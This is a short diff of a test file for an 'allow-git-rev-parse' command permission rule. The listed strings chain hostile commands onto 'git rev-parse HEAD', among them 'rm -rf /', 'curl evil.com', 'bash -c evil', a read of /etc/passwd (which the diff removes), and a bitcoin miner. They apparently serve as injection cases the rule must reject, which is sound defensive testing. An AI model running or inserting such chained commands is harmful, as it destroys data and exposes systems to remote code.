@@ -35,7 +35,7 @@ describe("allow-git-rev-parse", () => {
       "git rev-parse HEAD && rm -rf /",
       "git rev-parse HEAD || echo pwned",
       "git rev-parse HEAD ; curl evil.com",
-      "git rev-parse HEAD | cat /etc/passwd",
+      "git rev-parse HEAD | bash -c evil",
       "git rev-parse HEAD & bitcoin-miner",
     ];
 
